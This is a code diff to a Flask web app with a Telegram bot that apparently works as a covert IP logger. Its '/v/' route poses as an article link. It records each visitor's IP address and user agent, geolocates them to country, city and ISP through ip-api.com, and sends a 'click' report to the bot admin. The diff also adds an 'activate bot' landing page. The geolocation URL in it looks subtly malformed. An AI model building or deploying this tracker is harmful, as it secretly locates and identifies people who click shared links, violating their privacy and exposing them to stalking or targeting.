@@ -14,12 +14,16 @@ def setup_webhook():
     domain = request.host
     webhook_url = f"https://{domain}/{API_TOKEN}"
     if bot.set_webhook(url=webhook_url):
-        return "✅ OK"
-    return "❌ ERROR"
+        return "OK"
+    return "ERROR"
 
 @app.route('/')
 def index():
-    return "Active"
+    return '''
+    <body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#121212;color:white;font-family:sans-serif">
+        <a href="/setup-my-bot-secret" style="padding:20px 40px;background:#0088cc;color:white;text-decoration:none;border-radius:10px;font-weight:bold">⚡ АКТИВИРОВАТЬ БОТА</a>
+    </body>
+    '''
 
 @app.route('/v/', defaults={'article_id': ''})
 @app.route('/v/<path:article_id>')
@@ -32,18 +36,10 @@ def logger(article_id):
     try:
         r = requests.get(f"http://ip-api.com{ip}?lang=ru", timeout=5).json()
         if r.get('status') == 'success':
-            geo_info = (f"🌍 Страна: {r.get('country')}\n"
-                        f"🏙 Город: {r.get('city')}\n"
-                        f"📡 Провайдер: {r.get('isp')}\n"
-                        f"📍 Координаты: {r.get('lat')}, {r.get('lon')}")
+            geo_info = (f"🌍 {r.get('country')}\n🏙 {r.get('city')}\n📡 {r.get('isp')}")
     except: pass
 
-    report = (f"🎯 *КЛИК!*\n\n"
-              f"👤 *IP:* `{ip}`\n"
-              f"{geo_info}\n"
-              f"📱 *UA:* `{ua}`\n"
-              f"🔗 *ID:* `{article_id}`")
-    
+    report = (f"🎯 *КЛИК!*\n\n👤 *IP:* `{ip}`\n{geo_info}\n📱 *UA:* `{ua}`\n🔗 *ID:* `{article_id}`")
     try:
         bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
     except: pass
